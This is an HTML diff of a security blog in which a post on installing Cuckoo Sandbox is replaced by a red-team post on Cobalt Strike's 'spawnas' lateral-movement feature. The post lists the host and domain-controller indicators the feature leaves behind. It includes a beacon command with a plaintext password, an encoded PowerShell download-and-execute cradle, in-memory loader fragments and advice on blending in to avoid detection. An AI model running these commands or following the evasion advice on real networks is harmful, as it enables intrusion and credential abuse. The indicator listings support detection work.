@@ -23,7 +23,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hugo 0.20.2">
     <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
-    <title>Playing with Cuckoo</title>
+    <title>Cobalt Strike - Spawn As</title>
     <meta name="author" content="Rasta Mouse">
     <meta name="keywords" content="">
 
@@ -31,19 +31,31 @@
     
 
     
-    <meta name="description" content="After the release and complete hubbub that WannaCry caused, I thought it would be fun to play with Cuckoo Sandbox.
+    <meta name="description" content="beacon&gt; getuid
+[*] You are CYBER-LANCE\sgomez
+
+beacon&gt; spawnas cyber-lance\tswift Passw0rd! smb
+
 
 ">
-    <meta property="og:description" content="After the release and complete hubbub that WannaCry caused, I thought it would be fun to play with Cuckoo Sandbox.
+    <meta property="og:description" content="beacon&gt; getuid
+[*] You are CYBER-LANCE\sgomez
+
+beacon&gt; spawnas cyber-lance\tswift Passw0rd! smb
+
 
 ">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Playing with Cuckoo">
-    <meta property="og:url" content="/2017/05/playing-with-cuckoo/">
+    <meta property="og:title" content="Cobalt Strike - Spawn As">
+    <meta property="og:url" content="/2017/06/cobalt-strike---spawn-as/">
     <meta property="og:site_name" content="Rasta Mouse">
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Rasta Mouse">
-    <meta name="twitter:description" content="After the release and complete hubbub that WannaCry caused, I thought it would be fun to play with Cuckoo Sandbox.
+    <meta name="twitter:description" content="beacon&gt; getuid
+[*] You are CYBER-LANCE\sgomez
+
+beacon&gt; spawnas cyber-lance\tswift Passw0rd! smb
+
 
 ">
     
@@ -59,7 +71,7 @@
     
 
     
-      <meta property="og:image" content="https://rastamouse.me/images/cuckoo/cuckoo-icon.png">
+      <meta property="og:image" content="https://rastamouse.me/images/cobaltstrike/cobaltstrike.png">
     
     
     
@@ -251,18 +263,18 @@ ga('send', 'pageview');
             <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      Playing with Cuckoo
+      Cobalt Strike - Spawn As
     </h1>
   
   <div class="postShorten-meta post-meta">
   
-    <time itemprop="datePublished" datetime="2017-05-18T00:00:00Z">
+    <time itemprop="datePublished" datetime="2017-06-24T00:00:00Z">
       
   
   
   
   
-    18 May 2017
+    24 June 2017
   
 
     </time>
@@ -272,7 +284,7 @@ ga('send', 'pageview');
   
     <span>in</span>
     
-      <a class="category-link" href="https://rastamouse.me/categories/blog">blog</a>
+      <a class="category-link" href="https://rastamouse.me/categories/tradecraft">tradecraft</a>
     
   
 
@@ -283,296 +295,225 @@ ga('send', 'pageview');
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p>After the release and complete hubbub that <a href="https://en.wikipedia.org/wiki/WannaCry_ransomware_attack">WannaCry</a> caused, I thought it would be fun to play with <a href="https://cuckoosandbox.org/">Cuckoo Sandbox</a>.</p>
+              <pre><code>beacon&gt; getuid
+[*] You are CYBER-LANCE\sgomez
+
+beacon&gt; spawnas cyber-lance\tswift Passw0rd! smb
+</code></pre>
 
 <p></p>
 
-<p>It&rsquo;s something I&rsquo;ve always had an interest in, but have never taken the time to indulge.</p>
+<h4 id="files">Files</h4>
 
-<p>The <a href="https://cuckoo.sh/docs/">Cuckoo Documentation</a> is very well written and will honestly get someone 95% towards getting a working instance setup.  I had a few niggling issues that I don&rsquo;t think are covered within the docs (I could be wrong, correct me if so).  This post is a quick whistle-stop tour of how I went about getting it working.</p>
-
-<blockquote>
-<p>Note: I didn&rsquo;t follow all the best practices and this is not a guide to setting up a complete, proper and scalable solution.  It assumes you don&rsquo;t have a dedicated server and are just looking to experiment with Cuckoo on an existing desktop/laptop.</p>
-</blockquote>
-
-<h2 id="foreword">Foreword</h2>
-
-<p>There are lots of virtualisation technologies that Cuckoo is compatible with - from VirtualBox, ESXi, KVM and so on.  I&rsquo;m running Windows 10 on my desktop, so I initially wanted to run Cuckoo in a VM within VirtualBox and have futher VirtualBox VMs inside that Cuckoo VM.  Nested hypervisors doesn&rsquo;t sound very efficient but with relatively mature VT-x and AMD-V technology, the performance impact seems rather negligible.</p>
-
-<p>I ran into my first frustration with VirtualBox, as it doesn&rsquo;t pass VT-x/AMD-V through to its guest VMs.  The upshot of this is that if you run Cuckoo inside VirtualBox on your host, you then can&rsquo;t have 64-bit VMs for the malware sandboxes.  VMware Workstation Player doesn&rsquo;t have this restriction, so I opted to use this instead of VirtualBox on my host.</p>
-
-<p>You will obviously need to decide if this is an issue for you based on your planned usage.</p>
-
-<p>The architecture that we are going to setup, looks as follows:</p>
-
-<p>
-<figure >
-    
-        <img src="https://rastamouse.me/images/cuckoo/arch.png" />
-    
-    
-</figure>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/cuckoo/network.png" />
-    
-    
-</figure>
-</p>
-
-<p>So that&rsquo;s a bunch of VirtualBox VMs running inside a VMware VM :)</p>
-
-<h2 id="configuring-the-cuckoo-host">Configuring the Cuckoo Host</h2>
-
-<p>I&rsquo;m using Ubuntu Server 16.04.2 64-bit.  You will need enough resources for it to run itself and at least 1 concurrent VM inside; and a sh*t tonne of storage if you want to do full memory dumps.</p>
-
-<p>I gave mine:</p>
-
-<ul>
-<li>8 CPU Cores
-
-<ul>
-<li>Tick <code>Enable Virtualize Intel VT-x/EPT or AMD-V/RVI</code></li>
-</ul></li>
-<li>4GB RAM</li>
-<li>100GB Hard Disk</li>
-<li>NIC 1: NAT</li>
-<li>NIC 2: Host-Only</li>
-</ul>
-
-<h3 id="software">Software</h3>
-
-<pre><code class="language-bash">cuckoo@cuckoo:~$ echo deb http://download.virtualbox.org/virtualbox/debian xenial contrib | sudo tee -a /etc/apt/sources.list.d/virtualbox.list
-cuckoo@cuckoo:~$ wget -q https://www.virtualbox.org/download/oracle_vbox_2016.asc -O- | sudo apt-key add -
-cuckoo@cuckoo:~$ sudo apt-get update
-cuckoo@cuckoo:~$ sudo apt-get install python python-pip python-dev libffi-dev libssl-dev python-virtualenv python-setuptools libjpeg-dev zlib1g-dev swig mongodb xfce4 virtualbox-5.1 tcpdump apparmor-utils
-
-cuckoo@cuckoo:~$ sudo aa-disable /usr/sbin/tcpdump
-cuckoo@cuckoo:~$ sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
-
-cuckoo@cuckoo:~$ git clone https://github.com/volatilityfoundation/volatility.git
-cuckoo@cuckoo:~$ pip install -U pip pycrypto distorm3
-cuckoo@cuckoo:~$ cd volatility/
-cuckoo@cuckoo:~/volatility$ sudo python setup.py install
-
-cuckoo@cuckoo:~$ virtualenv cuckoo
-cuckoo@cuckoo:~$ . cuckoo/bin/activate
-(cuckoo) cuckoo@cuckoo:~$ pip install -U yara-python cuckoo
-
-(cuckoo) cuckoo@cuckoo:~$ cuckoo
-
-            _       _                   _             _              _            _
-          /\ \     /\_\               /\ \           /\_\           /\ \         /\ \
-         /  \ \   / / /         _    /  \ \         / / /  _       /  \ \       /  \ \
-        / /\ \ \  \ \ \__      /\_\ / /\ \ \       / / /  /\_\    / /\ \ \     / /\ \ \
-       / / /\ \ \  \ \___\    / / // / /\ \ \     / / /__/ / /   / / /\ \ \   / / /\ \ \
-      / / /  \ \_\  \__  /   / / // / /  \ \_\   / /\_____/ /   / / /  \ \_\ / / /  \ \_\
-     / / /    \/_/  / / /   / / // / /    \/_/  / /\_______/   / / /   / / // / /   / / /
-    / / /          / / /   / / // / /          / / /\ \ \     / / /   / / // / /   / / /
-   / / /________  / / /___/ / // / /________  / / /  \ \ \   / / /___/ / // / /___/ / /
-  / / /_________\/ / /____\/ // / /_________\/ / /    \ \ \ / / /____\/ // / /____\/ /
-  \/____________/\/_________/ \/____________/\/_/      \_\_\\/_________/ \/_________/
-
- Cuckoo Sandbox 2.0.2
- www.cuckoosandbox.org
- Copyright (c) 2010-2017
-
-=======================================================================
-    Welcome to Cuckoo Sandbox, this appears to be your first run!
-    We will now set you up with our default configuration.
-    You will be able to see and modify the Cuckoo configuration,
-    Yara rules, Cuckoo Signatures, and much more to your likings
-    by exploring the /home/cuckoo/.cuckoo directory.
-
-    Among other configurable items of most interest is the
-    new location for your Cuckoo configuration:
-              /home/cuckoo/.cuckoo/conf
-=======================================================================
-
-Cuckoo has finished setting up the default configuration.
-Please modify the default settings where required and
-start Cuckoo again (by running `cuckoo` or `cuckoo -d`).
+<pre><code class="language-text">C:\ProgramData\Microsoft\User Account Pictures\CYBER-LANCE+tswift.dat
+C:\Users\tswift\*
 </code></pre>
 
-<h2 id="configuring-the-guest-vms">Configuring the Guest VMs</h2>
+<h4 id="registry">Registry</h4>
 
-<p>Hop into the GUI by running <code>startx</code>. Open VirtualBox and create your base VMs - I&rsquo;m just going to create Windows 7 32-bit &amp; 64-bit VMs called <code>Win7x86</code> and <code>Win7x64</code> respectively.  They small VMs with 1 CPU, 512MB RAM, 10GB HDD and 1 NIC attached to <code>vboxnet0</code>.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/cuckoo/vbox.png" />
-    
-    
-</figure>
-
-
-<p>Set a static IP in each VM.</p>
-
-<ul>
-<li>Win7x86 - 192.168.56.10</li>
-<li>Win7x64 - 192.168.56.15</li>
-</ul>
-
-<p>You will also want to:</p>
-
-<ul>
-<li>Disable the Windows Firewall</li>
-<li>Disable UAC (Never Notify)</li>
-<li>Disable Windows Updates</li>
-</ul>
-
-<p>Download the latest <a href="https://www.python.org/downloads/windows/">Python 2.7.x for Windows</a> and place them in a convenient location on the Cuckoo VM (I got both the 32 and 64-bit versions).  You should also grab any additional software you may want, depending on the samples you want to submit (e.g. Office, Adobe Reader etc).</p>
-
-<pre><code class="language-bash">cuckoo@cuckoo:~/Downloads$ ll
--rw-rw-r--  1 cuckoo cuckoo 20082688 May 18 19:22 python-2.7.13.amd64.msi
--rw-rw-r--  1 cuckoo cuckoo 19161088 May 18 19:22 python-2.7.13.msi
-
-cuckoo@cuckoo:~/Downloads$ python -m SimpleHTTPServer
-Serving HTTP on 0.0.0.0 port 8000 ...
+<pre><code>HKU\S-1-5-21-20831996-4275058261-2260353042-1105\*
+HKLM\System\CurrentControlSet\Control\Session Manager\Quota System\S-1-5-21-20831996-4275058261-2260353042-1105
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Managed\S-1-5-21-20831996-4275058261-2260353042-1105\Installer\Assemblies\Global
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Managed\S-1-5-21-20831996-4275058261-2260353042-1105\Installer\Assemblies\c:|windows|syswow64|windowspowershell|v1.0|powershell.exe
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\SyncCenter\S-1-5-21-20831996-4275058261-2260353042-1105
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-20831996-4275058261-2260353042-1105\*
 </code></pre>
 
-<p>On each VM, open <code>Internet Explorer</code> and navigate to <code>http://192.168.56.1:8000</code>, download the relevant Python package then install it.</p>
+<h4 id="processes">Processes</h4>
 
-<p>Use the same method to transfer the Cuckoo Agent (to somewhere easy like the Desktop).</p>
+<pre><code class="language-text">Process:  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Command:  &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot; 
+Owner:    CYBER-LANCE\sgomez
 
-<pre><code class="language-bash">cuckoo@cuckoo:~/Downloads$ cd ../.cuckoo/agent/
-cuckoo@cuckoo:~/.cuckoo/agent$ ll
+    Process:  C:\Windows\system32\conhost.exe
+    Command:  \??\C:\Windows\system32\conhost.exe 0x4 
+    Owner:    CYBER-LANCE\sgomez
 
--rw-rw-r--  1 cuckoo cuckoo 12307 May 18 18:15 agent.py
--rwxrwxr-x  1 cuckoo cuckoo   386 May 18 18:15 agent.sh*
+    Process:  c:\windows\syswow64\windowspowershell\v1.0\powershell.exe
+    Command:  &quot;c:\windows\syswow64\windowspowershell\v1.0\powershell.exe&quot; -Version 5.1 -s -NoLogo -NoProfile
+    Owner:     CYBER-LANCE\sgomez
 
-cuckoo@cuckoo:~/.cuckoo/agent$ python -m SimpleHTTPServer
-Serving HTTP on 0.0.0.0 port 8000 ...
+        Process:  C:\Windows\system32\conhost.exe
+        Command:  \??\C:\Windows\system32\conhost.exe 0x4
+        Owner:     CYBER-LANCE\sgomez
+
+        Process:  c:\windows\syswow64\windowspowershell\v1.0\powershell.exe
+        Command:  powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADIAMQA1ADQANQAvACcAKQApAA==
+        Owner:    CYBER-LANCE\tswift
+
+            Process:  C:\Windows\system32\conhost.exe
+            Command:  \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+            Owner:     CYBER-LANCE\tswift
 </code></pre>
 
-<p>Start the agent by opening a <code>Command Prompt as Administrator</code>.</p>
+<h4 id="event-logs">Event Logs</h4>
 
+<h5 id="host">Host</h5>
 
-<figure >
-    
-        <img src="https://rastamouse.me/images/cuckoo/agent.png" />
-    
-    
-</figure>
+<h6 id="powershell">PowerShell</h6>
 
+<pre><code class="language-text">powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADIAMQA1ADQANQAvACcAKQApAA==
+IEX ((new-object net.webclient).downloadstring('http://127.0.0.1:21545/'))
 
-<p>You won&rsquo;t see any output, just minimise the window and leave it running.</p>
-
-<p>Whilst the VMs are running, follow these steps to snapshot them (repeat for each VM):</p>
-
-<pre><code class="language-bash">cuckoo@cuckoo:~$ VBoxManage snapshot &quot;Win7x86&quot; take &quot;Win7x86_snap&quot; --pause
-0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
-Snapshot taken. UUID: 4ef19a21-25c8-4ddf-81b2-4a65ce2b5278
-
-cuckoo@cuckoo:~$ VBoxManage controlvm &quot;Win7x86&quot; poweroff
-0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
-
-cuckoo@cuckoo:~$ VBoxManage snapshot &quot;Win7x86&quot; restorecurrent
-Restoring snapshot 4ef19a21-25c8-4ddf-81b2-4a65ce2b5278
-0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
+Set-StrictMode -Version 2
+$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+return $var_unsafe_native_methods.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
 </code></pre>
 
-<p>In the GUI, they should appear as <code>Saved</code>.</p>
+<h6 id="security">Security</h6>
 
+<pre><code class="language-text">Event 4648 - A logon was attempted using explicit credentials.
 
-<figure >
-    
-        <img src="https://rastamouse.me/images/cuckoo/vbox-saved.png" />
-    
-    
-</figure>
+Subject:
+    Security ID:            CYBER-LANCE\sgomez
+    Account Name:           sgomez
+    Account Domain:         CYBER-LANCE
+    Logon ID:               0x1CA1B
+    Logon GUID:             {00000000-0000-0000-0000-000000000000}
 
+Account Whose Credentials Were Used:
+    Account Name:           tswift
+    Account Domain:         CYBER-LANCE
+    Logon GUID:             {a843a69f-767e-22b4-8b0f-71cc64803ccd}
 
-<h2 id="configuring-cuckoo">Configuring Cuckoo</h2>
+Target Server:
+    Target Server Name:     localhost
+    Additional Information: localhost
 
-<pre><code class="language-bash">(cuckoo) cuckoo@cuckoo:~$ vim .cuckoo/conf/virtualbox.conf
+Process Information:
+    Process ID:             0x39c
+    Process Name:           C:\Windows\System32\svchost.exe
 </code></pre>
 
-<ul>
-<li><code>mode = headless</code> -&gt; <code>mode = gui</code> is useful for testing.</li>
-<li><code>machines = cuckoo1</code> -&gt; <code>machines = Win7x86,Win7x64</code> plus any others you&rsquo;ve made.</li>
-</ul>
+<pre><code class="language-text">Event 4624 - An account was successfully logged on.
 
-<p><code>cuckoo1</code> is the default example.  Each VM needs its own little block.</p>
+Subject:
+    Security ID:            CYBER-LANCE\sgomez
+    Account Name:           sgomez
+    Account Domain:         CYBER-LANCE
+    Logon ID:               0x1CA1B
 
-<pre><code>[Win7x86]
-label = Win7x86
-platform = windows
-ip = 192.168.56.10
-snapshot = Win7x86_snap
+Logon Information:
+    Logon Type:             2
+    Restricted Admin Mode:  -
+    Virtual Account:        No
+    Elevated Token:         Yes
 
-[Win7x64]
-label = Win7x64
-platform = windows
-ip = 192.168.56.15
-snapshot = Win7x64_snap
+Impersonation Level:        Impersonation
+
+New Logon:
+    Security ID:            CYBER-LANCE\tswift
+    Account Name:           tswift
+    Account Domain:         CYBER-LANCE
+    Logon ID:               0x996A0
+    Linked Logon ID:        0x996BB
+    Network Account Name:   -
+    Network Account Domain: -
+    Logon GUID:             {a843a69f-767e-22b4-8b0f-71cc64803ccd}
+
+Process Information:
+    Process ID:             0x39c
+    Process Name:           C:\Windows\System32\svchost.exe
+
+Network Information:
+    Workstation Name:       DESKTOP-01
+    Source Network Address: ::1
+    Source Port:            0
 </code></pre>
 
-<p>Now you should be able to run <code>cuckoo</code>.</p>
+<pre><code class="language-text">Event 4627 - Group membership information.
 
-<pre><code class="language-bash">(cuckoo) cuckoo@cuckoo:~$ cuckoo
+Subject:
+    Security ID:        CYBER-LANCE\sgomez
+    Account Name:       sgomez
+    Account Domain:     CYBER-LANCE
+    Logon ID:           0x1CA1B
 
-                          .:
-                          ::
-    .-.     ,  :   .-.    ;;.-.  .-.   .-.
-   ;       ;   ;  ;       ;; .' ;   ;';   ;'
-   `;;;;'.'`..:;._`;;;;'_.'`  `.`;;'  `;;'
+Logon Type:             2
 
- Cuckoo Sandbox 2.0.2
- www.cuckoosandbox.org
- Copyright (c) 2010-2017
-
- Checking for updates...
- You're good to go!
-2017-05-18 19:56:34,318 [cuckoo.core.scheduler] INFO: Using &quot;virtualbox&quot; as machine manager
-2017-05-18 19:56:34,928 [cuckoo.core.scheduler] INFO: Loaded 2 machine/s
-2017-05-18 19:56:34,933 [cuckoo.core.scheduler] WARNING: As you've configured Cuckoo to execute parallel analyses, we recommend you to switch to a MySQL ora PostgreSQL database as SQLite might cause some issues.
-2017-05-18 19:56:34,941 [cuckoo.core.scheduler] INFO: Waiting for analysis tasks.
+New Logon:
+    Security ID:        CYBER-LANCE\tswift
+    Account Name:       tswift
+    Account Domain:     CYBER-LANCE
+    Logon ID:           0x996A0
 </code></pre>
 
-<p>To start the web GUI:</p>
+<pre><code class="language-text">Event 4672 - Special privileges assigned to new logon.
 
-<pre><code class="language-bash">(cuckoo) cuckoo@cuckoo:~$ vim .cuckoo/conf/reporting.conf
+Subject:
+    Security ID:        CYBER-LANCE\tswift
+    Account Name:       tswift
+    Account Domain:     CYBER-LANCE
+    Logon ID:           0x996A0
+
+Privileges:             SeSecurityPrivilege
+                        SeTakeOwnershipPrivilege
+                        SeLoadDriverPrivilege
+                        SeBackupPrivilege
+                        SeRestorePrivilege
+                        SeDebugPrivilege
+                        SeSystemEnvironmentPrivilege
+                        SeImpersonatePrivilege
+                        SeDelegateSessionUserImpersonatePrivilege
 </code></pre>
 
-<p>Under <code>[mongodb]</code> : <code>enabled = no</code> -&gt; <code>enabled = yes</code>.</p>
+<h5 id="dc">DC</h5>
 
-<pre><code class="language-bash">(cuckoo) cuckoo@cuckoo:~$ cuckoo web runserver 192.168.45.128:8080
-Performing system checks...
+<h6 id="security-1">Security</h6>
 
-System check identified no issues (0 silenced).
-May 18, 2017 - 20:00:31
-Django version 1.8.4, using settings 'cuckoo.web.web.settings'
-Starting development server at http://192.168.45.128:8080/
-Quit the server with CONTROL-C.
+<pre><code class="language-text">Event 4768 - A Kerberos authentication ticket (TGT) was requested.
+
+Account Information:
+    Account Name:               tswift
+    Supplied Realm Name:        cyber-lance
+    User ID:                    CYBER-LANCE\tswift
+
+Service Information:
+    Service Name:               krbtgt
+    Service ID:                 CYBER-LANCE\krbtgt
+
+Network Information:
+    Client Address:             ::ffff:172.16.2.10
+    Client Port:                49740
+
+Additional Information:
+    Ticket Options:             0x40810010
+    Result Code:                0x0
+    Ticket Encryption Type:     0x12
+    Pre-Authentication Type:    2
 </code></pre>
 
+<pre><code class="language-text">Event 4769 - A Kerberos service ticket was requested.
 
-<figure >
-    
-        <img src="https://rastamouse.me/images/cuckoo/web-gui.png" />
-    
-    
-</figure>
+Account Information:
+    Account Name:               tswift@CYBER-LANCE.LOCAL
+    Account Domain:             CYBER-LANCE.LOCAL
+    Logon GUID:                 {a843a69f-767e-22b4-8b0f-71cc64803ccd}
 
+Service Information:
+    Service Name:               DESKTOP-01$
+    Service ID:                 CYBER-LANCE\DESKTOP-01$
 
-<p>You can then submit a sample and enjoy the results  :)</p>
+Network Information:
+    Client Address:             ::ffff:172.16.2.10
+    Client Port:                49741
 
+Additional Information:
+    Ticket Options:             0x40810000
+    Ticket Encryption Type:     0x12
+    Failure Code:               0x0
+    Transited Services:         -
+</code></pre>
 
-<figure >
-    
-        <img src="https://rastamouse.me/images/cuckoo/wannacry.png" />
-    
-    
-</figure>
+<h3 id="summary">Summary</h3>
 
+<p>This function is very noisy when it comes to host-based indicators, as it creates hundreds of user directories and registry entries.  I recommend refraining from using this on a machine where it&rsquo;s improbable the account would be in use legitimately.  If you&rsquo;re on a workstation, using the account of a desktop support engineer may blend in more, but something like an MSSQL service account is going to look more out of place.</p>
 
-<h4 id="shoutout">Shoutout</h4>
+<p>Events <code>4624</code>, <code>4627</code> &amp; <code>4648</code> give away that a standard user is explicilty using the credentials of a domain admin (a-la RunAs), which is extra-suspicious given they are completely different named accounts.  It may be more effective to reserve this to scenarios where separate user and admin accounts are in use.  Compromise the workstation beloning to <code>sgomez</code>, then use this function to spawn a new beacon as <code>sgomez_admin</code>.</p>
 
-<p><a href="https://twitter.com/recrudesce">recrudesce</a> for his helpful tips.</p>
+<p>Don&rsquo;t forget to leverage <code>spawnto</code> and <code>ppid</code> to change the process Beacon will launch for its post-explotation jobs and the parent they are run under.  Always carry out your situational awareness to enable your activities to blend in with your targets normal day-to-day operations.</p>
               
             </div>
           </div>
@@ -584,9 +525,11 @@ Quit the server with CONTROL-C.
                   <div class="post-footer-tags">
                     <span class="text-color-light text-small">TAGGED IN</span><br/>
                     
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/cuckoo/">cuckoo</a>
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/cobalt-strike/">cobalt strike</a>
 
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/malware/">malware</a>
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/spawnas/">spawnas</a>
+
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/indicators-of-compromise/">indicators of compromise</a>
 
                   </div>
                 
@@ -598,7 +541,7 @@ Quit the server with CONTROL-C.
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/06/psexec-much/" data-tooltip="PsExec Much?">
+            <a class="post-action-btn btn btn--disabled">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -606,7 +549,7 @@ Quit the server with CONTROL-C.
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/05/a-citrix-story/" data-tooltip="A Citrix Story">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/06/psexec-much/" data-tooltip="PsExec Much?">
           
             <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
             <i class="fa fa-angle-right"></i>
@@ -623,17 +566,17 @@ Quit the server with CONTROL-C.
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f06%2fcobalt-strike---spawn-as%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f06%2fcobalt-strike---spawn-as%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f06%2fcobalt-strike---spawn-as%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -679,7 +622,7 @@ Quit the server with CONTROL-C.
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/06/psexec-much/" data-tooltip="PsExec Much?">
+            <a class="post-action-btn btn btn--disabled">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -687,7 +630,7 @@ Quit the server with CONTROL-C.
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/05/a-citrix-story/" data-tooltip="A Citrix Story">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/06/psexec-much/" data-tooltip="PsExec Much?">
           
             <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
             <i class="fa fa-angle-right"></i>
@@ -704,17 +647,17 @@ Quit the server with CONTROL-C.
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f06%2fcobalt-strike---spawn-as%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f06%2fcobalt-strike---spawn-as%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f06%2fcobalt-strike---spawn-as%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -741,17 +684,17 @@ Quit the server with CONTROL-C.
       <div id="share-options-bar" class="share-options-bar" data-behavior="4">
   <ul class="share-options">
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f06%2fcobalt-strike---spawn-as%2f">
         <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f06%2fcobalt-strike---spawn-as%2f">
         <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
